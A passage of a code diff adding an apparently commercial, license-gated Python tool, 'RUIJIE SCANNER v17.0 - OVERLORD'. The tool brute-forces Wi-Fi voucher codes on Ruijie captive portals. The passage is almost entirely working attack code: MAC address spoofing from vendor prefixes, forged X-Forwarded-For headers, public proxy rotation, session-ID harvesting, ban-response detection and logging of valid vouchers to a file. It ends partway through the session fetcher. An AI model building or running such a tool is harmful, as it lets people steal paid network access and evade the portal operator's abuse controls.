+            console.print("[bold red][-] Invalid License Key![/bold red]")
+    except Exception:
+        console.print("[bold red][-] Invalid Key Format![/bold red]")
+    
+    return False
+
+# ==========================================
+# 🚀 MAIN SCANNER CODE
+# ==========================================
+
+CONCURRENCY = 100
+TIMEOUT = 5
+SID_POOL_MAX = 500
+
+console = Console()
+
+OUI_POOL = [
+    "64:CC:2E", "78:11:DC", "50:8F:4C", "8C:AA:B5", "9C:99:A0",
+    "8C:77:12", "34:23:BA", "C0:BD:D1", "BC:14:85", "38:AA:3C",
+    "3C:2E:F9", "F0:18:98", "8C:85:90", "BC:92:6B", "D0:81:7A",
+    "60:15:C7", "4C:1A:95", "A4:50:46", "5C:1A:6F",
+    "3C:AB:8E", "90:2B:34", "4C:74:03", "F4:8B:32",
+]
+
+SOFT_BAN_PATTERNS = ["request%20limited", "request limited", "too many", "banned", "blocked", "forbidden", "access denied"]
+SID_PATTERNS = [r'sessionId=([A-Za-z0-9]{6,})', r'"sessionId"\s*:\s*"([^"]+)"', r'sessionId["\']?\s*[=:]\s*["\']?([A-Za-z0-9\-]{6,})']
+
+def extract_sid_from_text(text):
+    if not text: return None
+    for pat in SID_PATTERNS:
+        m = re.search(pat, text)
+        if m: return m.group(1)
+    return None
+
+def extract_sign_ts_from_text(text):
+    sign = None; ts = None
+    if not text: return sign, ts
+    m = re.search(r'[?&]sign=([^&"\'\s]+)', text)
+    if m: sign = m.group(1)
+    m = re.search(r'[?&]timestamp=([^&"\'\s]+)', text)
+    if m: ts = m.group(1)
+    return sign, ts
+
+TIME_LEFT_KEYS = [
+    'remainingTime', 'remainTime', 'leftTime', 'timeLeft', 'surplusTime',
+    'validTime', 'availTime', 'availableTime', 'duration', 'durationLeft',
+    'expireIn', 'expiresIn', 'ttl', 'remaining_seconds', 'remainingSeconds',
+    'remain_seconds', 'time_remaining', 'expiredTime', 'expireTime',
+    'expiresAt', 'validUntil', 'expiryTime', 'endTime', 'end_time',
+]
+
+def _to_human(seconds):
+    try: seconds = int(float(seconds))
+    except (TypeError, ValueError): return None
+    if seconds <= 0: return "expired"
+    d, rem = divmod(seconds, 86400)
+    h, rem = divmod(rem, 3600)
+    m, s = divmod(rem, 60)
+    parts = []
+    if d: parts.append(f"{d}d")
+    if h: parts.append(f"{h}h")
+    if m and not d: parts.append(f"{m}m")
+    if s and not d and not h: parts.append(f"{s}s")
+    return " ".join(parts) if parts else f"{s}s"
+
+def _parse_hm_unit(text):
+    s = str(text).strip().lower()
+    total = 0; found = False
+    for num, unit in re.findall(r'(\d+(?:\.\d+)?)\s*([dhms])', s):
+        try: n = float(num)
+        except ValueError: continue
+        found = True
+        if unit == 'd': total += n * 86400
+        elif unit == 'h': total += n * 3600
+        elif unit == 'm': total += n * 60
+        elif unit == 's': total += n
+    if found: return int(total)
+    if re.fullmatch(r'\d+', s): return int(s)
+    return None
+
+def _find_time_value(obj, depth=0):
+    if depth > 5 or obj is None: return None, None
+    if isinstance(obj, dict):
+        for k in TIME_LEFT_KEYS:
+            if k in obj: return k, obj[k]
+        for k, v in obj.items():
+            if isinstance(k, str) and k.lower() in [x.lower() for x in TIME_LEFT_KEYS]: return k, v
+        for v in obj.values():
+            fk, fv = _find_time_value(v, depth + 1)
+            if fk is not None: return fk, fv
+    elif isinstance(obj, list):
+        for item in obj:
+            fk, fv = _find_time_value(item, depth + 1)
+            if fk is not None: return fk, fv
+    return None, None
+
+def parse_remaining_time(result):
+    if not isinstance(result, dict): return None, None
+    key, val = _find_time_value(result)
+    if key is None or val is None: return None, None
+    raw = val
+    if isinstance(val, (int, float)):
+        try: n = int(val)
+        except (TypeError, ValueError): n = 0
+        if n > 10**12: n //= 1000
+        if n > 10**9:
+            delta = n - int(datetime.now().timestamp())
+            return _to_human(delta), raw
+        return _to_human(n), raw
+    if isinstance(val, str):
+        s = val.strip()
+        if not s: return None, raw
+        sec = _parse_hm_unit(s)
+        if sec is not None: return _to_human(sec), raw
+    return None, raw
+
+def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')
+def fmt_elapsed(seconds):
+    seconds = int(seconds)
+    h = seconds // 3600; m = (seconds % 3600) // 60; s = seconds % 60
+    return f"{h:02d}:{m:02d}:{s:02d}"
+
+def get_gateway_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]; s.close()
+        parts = ip.split('.'); parts[-1] = '1'
+        return '.'.join(parts)
+    except Exception: return "192.168.110.1"
+
+def extract_params_from_url(url):
+    parsed = urlparse(url); query = parse_qs(parsed.query); params = {}
+    mapping = {'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address', 'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num', 'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'}
+    for key, mk in mapping.items():
+        if key in query: params[mk] = query[key][0]
+    if 'RES' in query: params['RES'] = query['RES'][0]
+    return params
+
+def auto_detect_portal():
+    session = requests.Session()
+    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
+    try:
+        r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+        if "ruijienetworks" in r.url: return r.url
+    except Exception: pass
+    for gw in [get_gateway_ip(), "192.168.110.1", "192.168.0.1"]:
+        try:
+            res = session.get(f"http://{gw}", timeout=3, allow_redirects=True)
+            if "ruijienetworks" in res.url: return res.url
+        except Exception: pass
+    return None
+
+
+class ProxyManager:
+    def __init__(self):
+        self.proxies = []
+        self.index = 0
+
+    async def fetch(self):
+        urls = [
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
+        ]
+        async with aiohttp.ClientSession() as session:
+            for url in urls:
+                try:
+                    async with session.get(url, timeout=5) as r:
+                        if r.status == 200:
+                            text = await r.text()
+                            for line in text.splitlines():
+                                line = line.strip()
+                                if line and ":" in line:
+                                    self.proxies.append(f"http://{line}")
+                except Exception: pass
+        self.proxies = list(set(self.proxies))
+
+    async def get_proxy(self):
+        if not self.proxies: return None
+        self.index = (self.index + 1) % len(self.proxies)
+        return self.proxies[self.index]
+
+
+class VoucherScanner:
+    def __init__(self):
+        self.mode = "num"
+        self.portal_url = ""
+        self.length = 6
+        
+        self.proxy_mgr = ProxyManager()
+        self.sid_pool = asyncio.Queue(maxsize=SID_POOL_MAX)
+        self.voucher_queue = asyncio.Queue()
+        
+        self._stop = False
+        self._display_active = False
+        self._live = None
+        self._identity_requests = 0
+
+        self._state = {
+            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
+            'elapsed': '00:00:00', 'found': [], 'valid': [], 'dead': [],
+            'status': 'Init...', 'session': 'None', 'current_code': '----',
+            'sid_pool': 0, 'workers': 0, 'proxies': 0
+        }
+
+        self.params = {
+            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
+            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.1",
+            "mac": "00:00:00:00:00:00", "slot_num": "14", "nasip": "192.168.1.193",
+            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
+            "url": "http://connectivitycheck.gstatic.com/generate_204",
+            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
+        }
+
+    def _gen_mac(self):
+        oui = random.choice(OUI_POOL)
+        return f"{oui}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}".lower()
+
+    def _gen_ip(self): return f"192.168.110.{random.randint(2, 254)}"
+
+    def _host(self):
+        pu = self.portal_url or str(self.params.get("url", ""))
+        if "portal-mm" in pu: return "portal-mm-as.ruijienetworks.com"
+        return "portal-as.ruijienetworks.com"
+
+    def apply_params_from_url(self, url):
+        self.portal_url = url
+        for k, v in extract_params_from_url(url).items():
+            if k in self.params: self.params[k] = v
+
+    def generate_voucher(self):
+        if self.mode == "num": return str(random.randint(0, 10**self.length - 1)).zfill(self.length)
+        elif self.mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=self.length))
+        elif self.mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=self.length))
+        return "0" * self.length
+
+    def make_layout(self):
+        s = self._state
+        layout = Layout()
+        layout.split_column(Layout(name="header", size=6), Layout(name="live", size=3), Layout(name="logs", ratio=1), Layout(name="hits", ratio=1))
+        
+        logo = Text()
+        logo.append(" ⚡ K E N O B E ⚡ \n", style="bold yellow on red")
+        logo.append("RUIJIE SCANNER v17.0 - OVERLORD\n", style="bold cyan")
+        sub = Text(f"Proxies: {s['proxies']} | SID Pool: {s['sid_pool']} | Workers: {s['workers']}", style="bold green", justify="center")
+        
+        layout["header"].update(Panel(Align.center(Text.assemble(logo, sub)), border_style="magenta", box=DOUBLE))
+
+        rate = len(s['found']) / (s['checked'] / 1000) if s['checked'] > 0 else 0
+        
+        live_grid = Table.grid(padding=0, expand=True)
+        for _ in range(4): live_grid.add_column(ratio=2)
+        live_grid.add_row(
+            Panel(Align.center(Text(s['current_code'], style="bold green")), title="Code", border_style="green", box=HEAVY),
+            Panel(Align.center(Text(f"{s['checked']:,}/{s['total']:,}", style="bold cyan")), title="Checked", border_style="cyan", box=HEAVY),
+            Panel(Align.center(Text(f"{s['speed']:,}/min", style="bold yellow")), title="Speed", border_style="yellow", box=HEAVY),
+            Panel(Align.center(Text(f"{len(s['found'])} ({rate:.2f}/k)", style="bold magenta")), title="Hits", border_style="magenta", box=HEAVY),
+        )
+        layout["live"].update(live_grid)
+
+        log_text = Text()
+        log_text.append(f"[bold cyan]Session:[/] {s['session'][:15] if s['session'] else 'None'}...\n")
+        log_text.append(f"[bold yellow]Elapsed:[/] {s['elapsed']}   [bold green]Status:[/] {s['status']}\n")
+        log_text.append(f"[bold magenta]Progress:[/] [{'█' * int(30 * s['percentage'] / 100)}{'░' * (30 - int(30 * s['percentage'] / 100))}] {s['percentage']:.2f}%\n")
+        layout["logs"].update(Panel(log_text, title="[bold blue]SYSTEM STATUS[/]", border_style="blue", box=ROUNDED))
+
+        hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
+        hits_table.add_column("Type", width=9, justify="center")
+        hits_table.add_column("Time", width=9, justify="center")
+        hits_table.add_column("Voucher", justify="center")
+        hits_table.add_column("TimeLeft", width=14, justify="center")
+
+        for v, t, _url, tl in s['found']:
+            hits_table.add_row("[bold green]FOUND[/bold green]", f"[dim]{t}[/dim]", v, f"[bold green]{tl}[/bold green]" if tl else "[dim]-[/dim]")
+        for v, t, tl in s['valid']:
+            hits_table.add_row("[green]VALID[/green]", f"[dim]{t}[/dim]", v, f"[green]{tl}[/green]" if tl else "[dim]-[/dim]")
+        for v, t, kind in s['dead']:
+            if kind == "STA_LIMIT": hits_table.add_row("[yellow]LIMIT[/yellow]", f"[dim]{t}[/dim]", v, "[dim]real[/dim]")
+            else: hits_table.add_row("[red]EXPIRED[/red]", f"[dim]{t}[/dim]", v, "[dim]real[/dim]")
+
+        if not s['found'] and not s['valid'] and not s['dead']:
+            hits_table.add_row("", "", "[dim]No hits yet...[/dim]", "")
+
+        layout["hits"].update(Panel(hits_table, title=f"[bold yellow]HITS DASHBOARD (F: {len(s['found'])} | V: {len(s['valid'])} | D: {len(s['dead'])})[/]", border_style="yellow", box=ROUNDED))
+        return layout
+
+    def _render(self):
+        if not self._display_active: return
+        try: self._live.update(self.make_layout())
+        except Exception: pass
+
+    def _set_status(self, msg):
+        self._state['status'] = msg
+
+    async def _ui_loop(self):
+        while self._display_active:
+            self._render()
+            await asyncio.sleep(0.1)
+
+    def _record_hit(self, voucher, kind, logon_url="", tl=""):
+        clock = datetime.now().strftime("%H:%M:%S")
+        try:
+            with open("found_ruijie.txt", "a") as f:
+                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{clock}] [{kind}] {voucher} {logon_url} {tl}\n")
+        except Exception: 
+            pass
+        if kind == "FOUND": self._state['found'].append((voucher, clock, logon_url, tl))
+        elif kind == "VALID": self._state['valid'].append((voucher, clock, tl))
+        elif kind in ("STA_LIMIT", "EXPIRED"): self._state['dead'].append((voucher, clock, kind))
+
+    async def sid_fetcher(self, session):
+        while not self._stop:
+            try:
+                if self.sid_pool.full():
+                    await asyncio.sleep(1)
+                    continue
+
+                mac = self._gen_mac()
+                ip = self._gen_ip()
+                proxy = await self.proxy_mgr.get_proxy()
+                
+                headers = {
+                    'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{mac}',
+                    'Client-Mac': mac,
+                    'X-Forwarded-For': ip,
+                }
+                
+                temp_params = self.params.copy()
+                temp_params['mac'] = mac
+                temp_params['ip'] = ip
+                params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
+                url = f"https://{self._host()}/api/auth/wifidog?{params_str}"
+                
+                sid = None
+                sign = None
+                ts = None
+
+                if proxy:
+                    try:
+                        async with session.get(url, headers=headers, proxy=proxy, timeout=4, allow_redirects=False, ssl=False) as resp:
+                            loc = resp.headers.get('Location', '')
+                            if loc:
+                                q = parse_qs(urlparse(loc).query)
+                                sid = q.get('sessionId', [None])[0]
+                                sign = q.get('sign', [None])[0]
+                                ts = q.get('timestamp', [None])[0]
+                    except Exception: 
+                        pass
+
+                if not sid:
+                    try:
+                        async with session.get(url, headers=headers, timeout=4, allow_redirects=False, ssl=False) as resp:
+                            loc = resp.headers.get('Location', '')
+                            if loc:
+                                q = parse_qs(urlparse(loc).query)
+                                sid = q.get('sessionId', [None])[0]
+                                sign = q.get('sign', [None])[0]
+                                ts = q.get('timestamp', [None])[0]
+                    except Exception: 
+                        pass
